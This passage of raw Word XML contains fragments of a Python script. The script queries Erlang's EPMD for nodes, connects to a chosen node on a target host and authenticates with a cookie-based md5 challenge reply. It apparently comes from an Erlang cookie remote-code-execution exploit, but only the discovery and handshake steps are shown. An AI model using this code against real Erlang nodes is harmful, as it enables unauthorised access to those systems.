        <w:t xml:space="preserve"> connect to EPMD: %s\n terminating program" % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>msg</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sys.exit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(1)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
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>epm_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>socket.send</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">(EPM_NAME_CMD) #request </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Erlang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> nodes</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if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>epm_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>socket.recv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(4) == b'\x00\x00\x11\x11': # OK</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data = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>epm_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>socket.recv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(1024)</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data = data[</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>0:len</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(data) - 1].decode('</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ascii</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data = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>data.split</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>("\n")</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if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(data) == 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choise</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 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"Found " + data[0])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else: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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nMore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> than one node found, choose which one to use:")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line_number</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 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for line in data:</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line_number</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> += 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 %d) %s" %(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>line_number</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, line))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choise</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(input("\n&gt; "))</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ERLNAG_PORT = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>re.search</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>("\d+$",data[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>choise</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> - 1])[0])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else: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"Node list request error, exiting")</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sys.exit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>epm_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>socket.close</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gram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Connect to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Erlang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> port: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try:</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s = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>socket.socket</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>socket.AF_INET</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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socket.SOCK</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>_STREAM</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s.connect</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>((TARGET, ERLNAG_PORT))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except </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>socket.error</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>msg</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Couldnt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> connect to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Erlang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> server: %s\n terminating program" % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>msg</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sys.exit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(1)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
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s.send</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(NAME_MSG)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s.recv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(5)                    # Receive "ok" message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challenge = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s.recv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(1024)     # Receive "challenge" message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challenge = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>struct.unpack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>("&gt;I", challenge[9:13])[0]</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"Extracted challenge: {}".format(challenge))</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lastRenderedPageBreak/>
        <w:t># Add Challenge Digest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CHALLENGE_REPLY += md5(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bytes(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>COOKIE, "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ascii</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 bytes(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>str</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(challenge), "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ascii</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>")</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>).digest</w:t>
      </w:r>
      <w:proofErr w:type="gram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proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s.send</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(CHALLENGE_REPLY)</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CHALLENGE_RESPONSE = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s.recv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(1024)</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if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(CHALLENGE_RESPONSE) == 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"Authentication failed, exiting")</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sys.exit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
